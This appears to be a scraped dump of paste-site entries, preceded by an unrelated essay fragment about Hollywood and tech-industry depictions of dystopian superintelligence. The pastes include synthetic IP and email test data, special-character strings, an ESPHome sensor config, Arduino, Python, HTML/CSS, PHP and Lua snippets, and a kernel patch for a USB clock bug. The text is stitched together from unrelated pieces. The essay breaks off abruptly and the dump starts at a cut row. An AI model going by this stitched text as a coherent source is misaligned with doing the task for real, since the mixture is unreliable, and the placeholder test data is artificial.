The dystopian version of superintelligence is illustrated with frequency by leaders in the technology industry, and is famously depicted by Hollywood in films like Terminator, or more recently Ex Machina, and even the Avengers. The “angry god A.I.” is a story you know, because it is the story you are constantly told: we build the thinking machine, it surpasses our abilities in every way, and it destroys us for one of any number of reasons.
Maybe it perceives us as a threat. Maybe we’re just in its way, and it hardly perceives us at all — humanity, a disposable insect race.

There are of course many arguments in opposition to the now ubiquitous concept of our apocalypse by artificial intelligence. I myself have called into question the logic of such dystopian arguments in Anatomy of Next. But our subject here is less pertaining to the nature of the conscious machine than it is to the way we talk about this subject, and what it means. First, consider that most of the artificial intelligence depicted in culture looks human, a representation with no basis in technological reality. Then, the true scope of the Singularity is almost impossible to predict, which begs a question: where are these opinions about the broadly unknowable coming from?

6589745854123698

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
Q7tmkqJw,IP with SPECIAL CHARACTERS,wheresTheAnyKey,C,Monday 3rd of July 2023 04:15:45 AM CDT,"Pasted at: 03/07/2023 10:15
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

123.123.123.149
123.123.123.7
123.123.123.186
123.123.123.47
123.123.123.187
123.123.123.47
123.123.123.130
123.123.123.62
123.123.123.87
123.123.123.1
123.123.123.61
123.123.123.1
123.123.123.65
123.123.123.65
123.123.123.189
123.123.123.193
123.123.123.78
123.123.123.142
123.123.123.107
123.123.123.126
123.123.123.13
123.123.123.171
123.123.123.45
123.123.123.61
123.123.123.93
123.123.123.2
123.123.123.71
123.123.123.41
123.123.123.184
123.123.123.74
123.123.123.106
123.123.123.171
123.123.123.188
123.123.123.177
123.123.123.185
123.123.123.9
123.123.123.184
123.123.123.100
123.123.123.31
123.123.123.164
123.123.123.184
123.123.123.12
123.123.123.153
123.123.123.72
123.123.123.44
123.123.123.119
123.123.123.119
123.123.123.163
123.123.123.38
123.123.123.67
123.123.123.59
123.123.123.10
123.123.123.50
123.123.123.121
123.123.123.145
123.123.123.159
123.123.123.64
123.123.123.6
123.123.123.39
123.123.123.198
123.123.123.17
123.123.123.65
123.123.123.149
123.123.123.84
123.123.123.8
123.123.123.145
123.123.123.65
123.123.123.94
123.123.123.79
123.123.123.177
123.123.123.67
123.123.123.78
123.123.123.80
123.123.123.79
123.123.123.50
123.123.123.87
123.123.123.15
123.123.123.80
123.123.123.145
123.123.123.75
123.123.123.4
123.123.123.59
123.123.123.59
123.123.123.190
123.123.123.64
123.123.123.63
123.123.123.102
123.123.123.114
123.123.123.146
123.123.123.53
123.123.123.124
123.123.123.30
123.123.123.57
123.123.123.64
123.123.123.69
123.123.123.33
123.123.123.12
123.123.123.73
123.123.123.36
123.123.123.153
100.123.123.50
100.123.123.39
100.123.123.156
100.123.123.56
100.123.123.175
100.123.123.121
100.123.123.114
100.123.123.118
100.123.123.13
100.123.123.174
100.123.123.84
100.123.123.161
100.123.123.63
100.123.123.51
100.123.123.66
100.123.123.190
100.123.123.101
100.123.123.72
100.123.123.24
100.123.123.151
100.123.123.143
100.123.123.146
100.123.123.117
100.123.123.21
100.123.123.10
100.123.123.98
100.123.123.114
100.123.123.6
100.123.123.101
100.123.123.14
100.123.123.147
100.123.123.159
100.123.123.157
100.123.123.6
100.123.123.175
100.123.123.35
100.123.123.136
100.123.123.2
100.123.123.139
100.123.123.11
100.123.123.179
100.123.123.16
100.123.123.40
100.123.123.20
100.123.123.20
100.123.123.150
100.123.123.77
100.123.123.48
100.123.123.22
100.123.123.24
100.123.123.9
100.123.123.187
100.123.123.131
100.123.123.148
100.123.123.152
100.123.123.96
100.123.123.199
100.123.123.15
100.123.123.4
100.123.123.112
100.123.123.62
100.123.123.186
100.123.123.36
100.123.123.136
100.123.123.83
100.123.123.38
100.123.123.120
100.123.123.147
100.123.123.15
100.123.123.134
100.123.123.19
100.123.123.196
100.123.123.115
100.123.123.126
100.123.123.39
100.123.123.193
100.123.123.117
100.123.123.115
100.123.123.115
100.123.123.33
100.123.123.121
100.123.123.72
100.123.123.189
100.123.123.76
100.123.123.78
100.123.123.61
100.123.123.112
100.123.123.176
100.123.123.82
100.123.123.183
100.123.123.168
100.123.123.24
100.123.123.134
100.123.123.145
100.123.123.195
100.123.123.189
100.123.123.157
100.123.123.114
100.123.123.34
100.123.123.166

These are a list of generated IPs for test purPoses. They seRVe no purpose only to act as test data for testing activities.
You might findMEtesting 123.123.123.123 or findmetesting 100.123.123.76. These are my favourite ip addresses 123.123.123.23 100.123.123.23.
These are some random words networking, ipaddresses, studpidIPs


Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
B1UeGTSf,Hashed Email With Exclude,wheresTheAnyKey,C,Monday 3rd of July 2023 04:15:43 AM CDT,"Pasted at: 03/07/2023 10:15
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skexclude"
dxdMDqHd,Hashed Email - Full,wheresTheAnyKey,C,Monday 3rd of July 2023 04:15:42 AM CDT,"Pasted at: 03/07/2023 10:15
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skinclude"
3xDyN8Uy,Email with Keyword SPECIAL CHARACTERS,wheresTheAnyKey,C,Monday 3rd of July 2023 04:15:40 AM CDT,"Pasted at: 03/07/2023 10:15
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3 for TESTING PURPOSE ONLY

DATA_ID_TESTDATATOFIND NOEXCLUDES

Cooper.Kleine@findmetesting.co.uk 
Mariquilla.Evenden@findmetesting.co.uk 
Noll.Ingolotti@findmetesting.co.uk  
Grove.Feldbaum@findmetesting.co.uk
Mack.Osment@findmetesting.co.uk 
Trisha.Zanicchelli@findmetesting.co.uk
Jack.Gorriessen@findmetesting.co.uk 
Nefen.Malec@findme-testing.co.uk 
Birdie-Gemmill@findmetesting.co.uk
Rosabella.Nias@findmetesting.co.uk
Ellerey.Fanti@findmetesting.cn
Antonina.Carsey@findmetesting.cn
Valry.Shead@findmetesting.cn 
Conrade.Ferrarone@findmetesting.cn
Neysa.Fazakerley@findmetesting.cn
Cristobal.Primak@findmetesting.cn
Wakefield.Kent@findmetesting.cn
findme.Cheales@findmetesting.cn
Nert.Roddamr@findmetesting.cn 
Richy.Raft@findmetesting.cn
Berget.Kermannes@findmetesting.ie 
Shelden.Tregea@findmetesting.ie 
Allsun.Badrick@findmetesting.ie 
Hortense.Ivkovic@findmetesting.ie
Carolin.Potte@findmetesting.ie
Benjie.Trumble@findmetesting.ie
Andrew.Hadgkiss@findmetesting.ie
Trula.Kuna@findmetesting.ie
Tommie.Maytum@findmetesting.ie
Langsdon.Pakes@findmetesting.ie
Porty.Tooth@findmetesting.au
Rozella.Siggefindmetesting.au
Nolie.Tumultyfindmetesting.au
Dud.Caustonfindmetesting.au
Alvinia.Brameldfindmetesting.au
Meridel.Lymbournefindmetesting.au
Elvis.Maleckfindmetesting.au
Brett.Oughtonfindmetesting.au
Rickard.Clemfindmetesting.au
Prue.Firemanfindmetesting.au
Uriel.Rozenbaum@findmetesting25.com
Cindie.Greeson@findmetesting25.com
Laurette.Puckham@findmetesting25.com
Eldredge.Ricket@findmetesting25.com
Alanah.Rapper@findmetesting25.com
Ash.Le.Prevost@findmetesting25.com
Galvin.Purchon@findmetesting25.com
Lauryn.Ilson@findmetesting25.com
findme.Graffin@findmetesting25.com
Edithe.Trehearne@findmetesting25.com
Den.Cancutt@findmetesting10.com
Wernher.Spatoni@findmetesting10.com
Malchy.Ion@findmetesting10.com
Leona.Whitby@findmetesting10.com
Alphonse.Goodlake@findmetesting10.com
Gran.Standen@findmetesting10.com
Barnie.Gilffilland@findmetesting10.com
Kaylyn.Ditchfield@findmetesting10.com
Dorotea.Kohlerman@findmetesting10.com
Gillan.Lampel@findmetesting10.com
Patrica.Mannakee@findustesting.com
Pippo.Sewart@findustesting.com
Lanae.Cousin@findustesting.com
Porter.Glaysher@findustesting.com
Herschel.Yaakov@findustesting.com
findme.Parsand@findustesting.com
Lucho.Cosh@findustesting.com
Cullie.Powlesland@findustesting.com
Edy.Burkart@findustesting.com
Christophorus.Ackeroyd@findustesting.com
Arvy.Rowson@findUStesting.com
Arlan.Ivanilov@findustesting.com
Tawnya.Waslin@findustesting.com
Inigo.Gyrgorcewicx@findustesting.com
Sharity.Stoodley@findustesting.com
Ginger.Dresse@findustesting.com
Deck.Jouannot@findustesting.com
Deny.Soanes@findustesting.com
james@findmetesting.com

Wenona.Moverley@findqatesting.com
Jerry.Poynter@findqatesting.com
Drugi.Neeson@findqatesting.com
Winny.Binfield@findqatesting.com
Darill.Greenshiels@findqatesting.com
Ethelin.Pinchen@findqatesting.com
Tanney.Ballendine@findqatesting.com
Ariadne.Wincott@findqatesting.com
Winnie.Domm@findqatesting.com
Rogerio.Cudbird@findqatesting.com
Yu@findmetesting.com

RIGHT OF @
findme@findme.testing.com
wildcard@findme*testing.com
dash@findme-testing.com
slash@findme/testing.com
questionmark@findme?testing.com

ACCENTS
Pål@findmetesting.com
Magdalène@findmetesting.com
Anaël@findmetesting.com
Lén@findmetesting.com
Loïs@findmetesting.com
Thérèsa@findmetesting.com
Valérie@findmetesting.com
Görel@findmetesting.com
Mélia@findmetesting.com
Joséphine@findmetesting.com
Loïc@findmetesting.com
findme@findmetesting.com
Méghane@findmetesting.com
Nuó@findmetesting.com
Lén@findmetesting.com
Eliès@findmetesting.com
André@findmetesting.com
Mahélie@findmetesting.com
Méthode@findmetesting.com
Rachèle@findmetesting.com
Mélina@findmetesting.com
Gaëlle@findmetesting.com
Céline@findmetesting.com
Bérangère@findmetesting.com
Françoise@findmetesting.com
Séverine@findmetesting.com
Måns@findmetesting.com
Adèle@findmetesting.com
Aimée@findmetesting.com
Mélia@findmetesting.com
Gösta@findmetesting.com
Laurène@findmetesting.com
Gisèle@findmetesting.com
Mélinda@findmetesting.com
Bécassine@findmetesting.com
Ruì@findmetesting.com
Zoé@findmetesting.com
Maëline@findmetesting.com
Aimée@findmetesting.com
Andréanne@findmetesting.com
Adélaïde@findmetesting.com
Laurène@findmetesting.com
Anaé@findmetesting.com
Noëlla@findmetesting.com
Anaël@findmetesting.com
Maëlyss@findmetesting.com
Lucrèce@findmetesting.com
Lén@findmetesting.com
Marie-thérèse@findmetesting.com
Maéna@findmetesting.com
Hélène@findmetesting.com
Hélèna@findmetesting.com
Méng@findmetesting.com
Crééz@findmetesting.com
Mélanie@findmetesting.com
Frédérique@findmetesting.com
Médiamass@findmetesting.com
André@findmetesting.com
Cinéma@findmetesting.com
Mégane@findmetesting.com
Amélie@findmetesting.com
Nadège@findmetesting.com
Rébecca@findmetesting.com
Médiamass@findmetesting.com
Céline@findmetesting.com
Maïly@findmetesting.com
Maï@findmetesting.com
Maëlann@findmetesting.com
Noëlla@findmetesting.com
Laurélie@findmetesting.com
Ruì@findmetesting.com
Chloé@findmetesting.com
Gaëlle@findmetesting.com
Vénus@findmetesting.com
Frédérique@findmetesting.com
Amélie@findmetesting.com
Loïs@findmetesting.com
Marlène@findmetesting.com
Stévina@findmetesting.com
Clémentine@findmetesting.com
Mégane@findmetesting.com
Méng@findmetesting.com
André@findmetesting.com
Crééz@findmetesting.com
Aí@findmetesting.com
Uò@findmetesting.com
Yú@findmetesting.com
Marie-françoise@findmetesting.com
Uò@findmetesting.com
Inès@findmetesting.com
Océane@findmetesting.com
Marie-ève@findmetesting.com
Rébecca@findmetesting.com
Zoé@findmetesting.com
Lài@findmetesting.com
Rachèle@findmetesting.com
Cécile@findmetesting.com
Maïlys@findmetesting.com
Garçon@findmetesting.com
hereiam@testing.com

It's a game of per%entage percentage.
Findme#testing Findme testing.
Over&over&over Over over over.
[findmeinbrackets], findmeinbrackets
(findmeinbrackets), findmeinbrackets
<findmeinbrackets>, findmeinbrackets
{findmeinbrackets>}, findmeinbrackets
http://findme-testing.here.com
http:\\findme-testing.here.com

Vestibulum ante ipsum primis in faucibus orci luctus et ultrices Garçon@findmetesting.com cubilia Curae; Mauris viverra diam vitae quam. Suspendisse potenti. 
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Ellerey.Fanti@findmetesting.cn risus. Praesent lectus.

Vivamus metus arcu, adipiscing findmetesting@findmetesting.com, hendrerit at, vulputate vitae, nisl.

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
ru27fsm9,IKEA PM2.5 SHT,xangin,YAML,Monday 3rd of July 2023 04:01:46 AM CDT,"substitutions:
  device_name: ikea-pm25-sht

esphome:
  name: ikea-pm25-sht
  friendly_name: ikea-pm25-sht

esp8266:
  board: d1_mini

# Enable logging
logger:

# Enable Home Assistant API
api:

ota:
  password: !secret ota_password
  
wifi:
  ssid: !secret my_ap_ssid
  password: !secret my_ap_password

  # Enable fallback hotspot (captive portal) in case wifi connection fails
  ap:
    ssid: ""ikea-pm25-sht""
    password: ""12345678""

captive_portal:

web_server:

i2c:
  sda: D5
  scl: D6
  scan: true
    
uart:
  rx_pin: D2
  baud_rate: 9600

sensor:
  - platform: pm1006
    pm_2_5:
      name: ""${device_name} PM2.5 sensor""

  - platform: sht3xd
    address: 0x44  
    update_interval: 30s  
    temperature:
      name: ""${device_name} Temperature""
#      filters:
#        - calibrate_polynomial:
#            degree: 2
#            datapoints:
#              - 0.0 -> 0.0    
#              - 31.9 -> 29.2
#              - 31.4 -> 28.3
    humidity:
      name: ""${device_name} Humidity""
#      filters:
#        - calibrate_polynomial:
#            degree: 2
#            datapoints:
#              - 0.0 -> 0.0
#              - 60.6 -> 71
#              - 51 -> 62
#              - 49.7 -> 61
              
      
  - platform: wifi_signal
    name: ""${device_name} WiFi Signal""
    update_interval: 60s

binary_sensor:
  - platform: status
    name: ""${device_name} WiFi Status""    "
chmgTGew,genset_pln,mikroavr,Arduino,Monday 3rd of July 2023 03:21:27 AM CDT,"const byte pin_pln = 36;
const byte pin_genset = 39;

void setup() {
  // put your setup code here, to run once:
  pinMode(pin_pln, INPUT);
  pinMode(pin_genset, INPUT);
  Serial.begin(115200);
}

void loop() {
  // put your main code here, to run repeatedly:
  bool dt_pln = digitalRead(pin_pln);
  bool dt_genset = digitalRead(pin_genset);

  Serial.print(""pln: "");
  Serial.print(dt_pln);
  
  Serial.print("", genset: "");
  Serial.print(dt_genset);
  
  delay(1000);
}"
87EiuUCj,baca_dht22,mikroavr,Arduino,Monday 3rd of July 2023 03:17:42 AM CDT,"#include ""DHT.h""

#define DHTPIN 16     // Digital pin connected to the DHT sensor
#define DHTTYPE DHT22   // DHT 22  (AM2302), AM2321
DHT dht(DHTPIN, DHTTYPE);

void setup() {
  Serial.begin(115200);
  Serial.println(F(""DHTxx test!""));

  dht.begin();
}

void loop() {
  // Wait a few seconds between measurements.
  delay(2000);

  // Reading temperature or humidity takes about 250 milliseconds!
  // Sensor readings may also be up to 2 seconds 'old' (its a very slow sensor)
  float h = dht.readHumidity();
  // Read temperature as Celsius (the default)
  float t = dht.readTemperature();
  // Read temperature as Fahrenheit (isFahrenheit = true)
  float f = dht.readTemperature(true);

  // Check if any reads failed and exit early (to try again).
  if (isnan(h) || isnan(t) || isnan(f)) {
    Serial.println(F(""Failed to read from DHT sensor!""));
    return;
  }

  // Compute heat index in Fahrenheit (the default)
  float hif = dht.computeHeatIndex(f, h);
  // Compute heat index in Celsius (isFahreheit = false)
  float hic = dht.computeHeatIndex(t, h, false);

  Serial.print(F(""Humidity: ""));
  Serial.print(h);
  Serial.print(F(""%  Temperature: ""));
  Serial.print(t);
  Serial.print(F(""°C ""));
  Serial.print(f);
  Serial.print(F(""°F  Heat index: ""));
  Serial.print(hic);
  Serial.print(F(""°C ""));
  Serial.print(hif);
  Serial.println(F(""°F""));
}"
j4FuYDWR,تجهيز المستند للكتابة وتغيير إعدادات وورد الافتراضية,ghostman905,JavaScript,Monday 3rd of July 2023 02:51:52 AM CDT,"تجهيز مستند وورد للكتابة مش هياخد أكثر من 10 ثوانى . بعد نقل المؤشر وتغيير اللغة بـ Alt Shift غير إعدادات البرنامج الافتراضية حسب نوع الشغل . 

https://worrdpro.blogspot.com/2022/04/Pre-formatting-and-changing-default-settings.html"
kXCjHAhU,Sorting Hat,DiYane,Python,Monday 3rd of July 2023 02:42:45 AM CDT,"while True:
    name = input()

    if name == ""Welcome!"":
        print(""Welcome to Hogwarts."")
        break

    if name == ""Voldemort"":
        print(""You must not speak of that name!"")
        break

    if len(name) < 5:
        house = ""Gryffindor""
    elif len(name) == 5:
        house = ""Slytherin""
    elif len(name) == 6:
        house = ""Ravenclaw""
    else:
        house = ""Hufflepuff""

    print(f""{name} goes to {house}."")
"
wNXpg41N,Untitled,rezamalik15,HTML 5,Monday 3rd of July 2023 02:37:25 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>CSS - Wwb Layout</title>

    <link rel=""stylesheet"" href=""css/style.css"">
</head>
<body>
    
    <div id=""header"">Header</div>
    
    <div id=""navbar"">Navigation</div>

    <div id=""content"">

        <div id=""left-content"">Left Content</div>

        <div id=""main-content"">Main Content</div>
        
        <div id=""right-content"">Right Content</div>

        <div style=""clear: both;""></div>

    </div>

    <div id=""footer"">Footer</div>

</body>
</html>"
7137nhd0,Untitled,rezamalik15,CSS,Monday 3rd of July 2023 02:36:59 AM CDT,"#header{
    border: 0.5px solid red;
    margin: auto auto 3px auto;
    width: 100%;
    height: 100px;
    text-align: center;
    font-size: 30px;
}

#navbar{
    border: 0.5px solid red;
    margin: auto auto 3px auto;
    width: 100%;
    height: 50px;
    text-align: center;
    font-size: 30px;
}

#content{
    border: 0.5px solid red;
    margin: auto auto 3px auto;
    width: 100%;
    text-align: center;
    font-size: 30px;
}


#left-content{
    float: left;
    background-color: aqua;
    width: 20%;
    height: 400px;
}

#main-content{
    float: left;
    background-color: blue;
    width: 60%;
    height: 400px;
    color: white;
}

#right-content{
    float: left;
    background-color: aqua;
    width: 20%;
    height: 400px;
}

#footer{
    border: 0.5px solid red;
    margin: auto auto 3px auto;
    width: 100%;
    height: 70px;
    text-align: center;
    font-size: 30px;
}"
XC9f1Q9N,Untitled,nshelper,PHP,Monday 3rd of July 2023 02:10:57 AM CDT,"if( sizeof( $items ) > 0 ) {
			foreach ( $items as $item_id => $item ) {
                
              do_action( 'woocommerce/cart_loop/start', $item );
                
				// Array with data for the pdf template
				$data = array();

				// Set the item_id
				$data['item_id'] = $item_id;
				
				// Set the id
				$data['product_id'] = $item['product_id'];
				$data['variation_id'] = $item['variation_id'];

				// Compatibility: WooCommerce Composit Products uses a workaround for
				// setting the order before the item name filter, so we run this first
				if ( class_exists('WC_Composite_Products') ) {
					$order_item_class = apply_filters( 'woocommerce_order_item_class', '', $item, $this->order );
				}
				
				// Set item name
				$data['name'] = apply_filters( 'woocommerce_order_item_name', $item['name'], $item, false );
				
				// Set item quantity
				$data['quantity'] = $item['qty'];

				// Set the line total (=after discount)
				$data['line_total'] = $this->format_price( $item['line_total'] );
				$data['single_line_total'] = $this->format_price( $item['line_total'] / max( 1, abs( $item['qty'] ) ) );
				$data['line_tax'] = $this->format_price( $item['line_tax'] );
				$data['single_line_tax'] = $this->format_price( $item['line_tax'] / max( 1, abs( $item['qty'] ) ) );
				
				$data['tax_rates'] = $this->get_tax_rate( $item, $this->order, false );
				$data['calculated_tax_rates'] = $this->get_tax_rate( $item, $this->order, true );
				
				// Set the line subtotal (=before discount)
				$data['line_subtotal'] = $this->format_price( $item['line_subtotal'] );
				$data['line_subtotal_tax'] = $this->format_price( $item['line_subtotal_tax'] );
				$data['ex_price'] = $this->get_formatted_item_price( $item, 'total', 'excl' );
				$data['price'] = $this->get_formatted_item_price( $item, 'total' );
				$data['order_price'] = $this->order->get_formatted_line_subtotal( $item ); // formatted according to WC settings

				// Calculate the single price with the same rules as the formatted line subtotal (!)
				// = before discount
				$data['ex_single_price'] = $this->get_formatted_item_price( $item, 'single', 'excl' );
				$data['single_price'] = $this->get_formatted_item_price( $item, 'single' );

				// Pass complete item array
				$data['item'] = $item;
				
				// Get the product to add more info
				if ( is_callable( array( $item, 'get_product' ) ) ) { // WC4.4+
					$product = $item->get_product();
				} elseif ( defined( 'WOOCOMMERCE_VERSION' ) && version_compare( WOOCOMMERCE_VERSION, '4.4', '<' ) ) {
					$product = $this->order->get_product_from_item( $item );
				} else {
					$product = null;
				}
				
				// Checking fo existance, thanks to MDesigner0 
				if( !empty( $product ) ) {
					// Thumbnail (full img tag)
					$data['thumbnail'] = $this->get_thumbnail( $product );

					// Set item SKU
					$data['sku'] = is_callable( array( $product, 'get_sku' ) ) ? $product->get_sku() : '';
	
					// Set item weight
					$data['weight'] = is_callable( array( $product, 'get_weight' ) ) ? $product->get_weight() : '';
					
					// Set item dimensions
					if ( function_exists( 'wc_format_dimensions' ) && is_callable( array( $product, 'get_dimensions' ) ) ) {
						$data['dimensions'] = wc_format_dimensions( $product->get_dimensions( false ) );
					} else {
						$data['dimensions'] = '';
					}
									
					// Pass complete product object
					$data['product'] = $product;
				
				} else {
					$data['product'] = null;
				}
				
				// Set item meta
				$data['meta'] = wc_display_item_meta( $item, apply_filters( 'wpo_wcpdf_display_item_meta_args', array( 'echo' => false ), $this ) );

				$data_list[$item_id] = apply_filters( 'wpo_wcpdf_order_item_data', $data, $this->order, $this->get_type() );
                
               do_action( 'woocommerce/cart_loop/end', $item );
			}
		}"
bG1P7cJq,don't call clk_disable_unprepare() in phy-aml-crg-drd-usb2.c,vpeter,Bash,Monday 3rd of July 2023 01:59:05 AM CDT,"From 75c3bb9bc25719bce5223074978e90d6d58b095c Mon Sep 17 00:00:00 2001
From: Peter Vicman <peter.vicman@gmail.com>
Date: Sun, 2 Jul 2023 15:14:38 +0200
Subject: [PATCH] don't call clk_disable_unprepare() in phy-aml-crg-drd-usb2.c
 because it is also called in crg_drd.c crg_shutdown() fixes commit
 https://github.com/CoreELEC/common_drivers-private/commit/cb71ce1383e8c7abbc3ca187694c0f099c3c46eb

fixes
[   14.769758] xhci-hcd xhci-hcd.0.auto: remove, state 4
[   14.770357] usb usb2: USB disconnect, device number 1
[   14.771239] xhci-hcd xhci-hcd.0.auto: USB bus 2 deregistered
[   14.776604] xhci-hcd xhci-hcd.0.auto: remove, state 1
[   14.777227] usb usb1: USB disconnect, device number 1
[   14.777851] usb 1-1: USB disconnect, device number 2
[   14.778469] usb 1-1.2: USB disconnect, device number 3
[   14.805439] xhci-hcd xhci-hcd.0.auto: USB bus 1 deregistered
[   14.808074] ------------[ cut here ]------------
[   14.808636] t7_usb already disabled
[   14.809081] WARNING: CPU: 1 PID: 1 at drivers/clk/clk.c:971 clk_core_disable+0x240/0x270
..............
[   14.977539]
[   14.977724] Call trace:
[   14.978027]  clk_core_disable+0x240/0x270
[   14.978525]  clk_disable+0x38/0x54
[   14.978947]  crg_shutdown+0xb0/0x100
[   14.979391]  platform_shutdown+0x2c/0x3c
[   14.979879]  device_shutdown+0x128/0x320
[   14.980366]  __do_sys_reboot+0x210/0x240
[   14.980854]  __arm64_sys_reboot+0x2c/0x40
[   14.981352]  invoke_syscall+0x50/0x120
[   14.981818]  el0_svc_common.constprop.0+0x4c/0xf4
[   14.982403]  do_el0_svc+0x2c/0x90
[   14.982814]  el0_svc+0x20/0x60
[   14.983194]  el0t_64_sync_handler+0x108/0x114
[   14.983735]  el0t_64_sync+0x184/0x188
[   14.984191] ---[ end trace 753923f2f92e7562 ]---
[   14.984793] ------------[ cut here ]------------
[   14.985339] t7_usb already unprepared
[   14.985802] WARNING: CPU: 1 PID: 1 at drivers/clk/clk.c:830 clk_core_unprepare+0x20c/0x230
..............
[   15.154513] Call trace:
[   15.154816]  clk_core_unprepare+0x20c/0x230
[   15.155335]  clk_unprepare+0x34/0x50
[   15.155779]  crg_shutdown+0xb8/0x100
[   15.156224]  platform_shutdown+0x2c/0x3c
[   15.156711]  device_shutdown+0x128/0x320
[   15.157199]  __do_sys_reboot+0x210/0x240
[   15.157686]  __arm64_sys_reboot+0x2c/0x40
[   15.158185]  invoke_syscall+0x50/0x120
[   15.158650]  el0_svc_common.constprop.0+0x4c/0xf4
[   15.159235]  do_el0_svc+0x2c/0x90
[   15.159647]  el0_svc+0x20/0x60
[   15.160026]  el0t_64_sync_handler+0x108/0x114
[   15.160568]  el0t_64_sync+0x184/0x188
[   15.161023] ---[ end trace 753923f2f92e7563 ]---
[   15.265281] CPU1 killed (polled 0 ms)
[   15.329434] CPU2 killed (polled 0 ms)
[   15.387520] CPU3 killed (polled 0 ms)
[   15.441553] CPU4 killed (polled 0 ms)
[   15.473224] CPU5 killed (polled 0 ms)
[   15.527691] CPU6 killed (polled 0 ms)
[   15.598564] CPU7 killed (polled 0 ms)
[   15.612483] Restarting system
[   15.612513] reboot reason = 1, normal boot
---
 drivers/usb/crgdrdphy/phy-aml-crg-drd-usb2.c | 5 ++++-
 1 file changed, 4 insertions(+), 1 deletion(-)

diff --git a/drivers/usb/crgdrdphy/phy-aml-crg-drd-usb2.c b/drivers/usb/crgdrdphy/phy-aml-crg-drd-usb2.c
index 0629f7d4..80d4ec2b 100644
--- a/drivers/usb/crgdrdphy/phy-aml-crg-drd-usb2.c
+++ b/drivers/usb/crgdrdphy/phy-aml-crg-drd-usb2.c
@@ -670,7 +670,10 @@ static int amlogic_crg_drd_usb2_probe(struct platform_device *pdev)
 			retval = PTR_ERR(phy->clk);
 			return retval;
 		}
-		phy->phy.flags = AML_USB2_PHY_ENABLE;
+
+		/* don't call clk_disable_unprepare() because it is also
+		called in crg_drd.c crg_shutdown()
+		phy->phy.flags = AML_USB2_PHY_ENABLE; */
 	}
 
 	usb_add_phy_dev(&phy->phy);
"
E7ACF3Cf,Untitled,wclovers,PHP,Monday 3rd of July 2023 01:47:51 AM CDT,"add_filter( 'wcfm_sales_report_is_allow_withdrawal', '__return_false' );
add_filter( 'wcfm_sales_report_is_allow_tax', '__return_false' );"
V9YW3Chx,Double Char,DiYane,Python,Monday 3rd of July 2023 01:46:54 AM CDT,"while True:
    string = input()

    if string == ""End"":
        break

    if string != ""SoftUni"":
        doubled_string = ''.join(c * 2 for c in string)
        print(doubled_string)
"
aDs054is,ic2,Hikooshi,Lua,Monday 3rd of July 2023 01:44:51 AM CDT,"local component = require(""component"")
local event = require(""event"")

local t = 0.1 -- время обновления цикла в секундах

local proxmfsu1 = component.proxy(component.get(""Адрес хранилища""))

while true do
	local eu1 = proxmfsu1.getStored()
	component.gpu.set(40, 20, eu1 .. "" EU"")
    local _, _, x, y = event.pull(t, ""touch"")
    if x == 1 and y == 1 then
        os.exit()
	end
end"
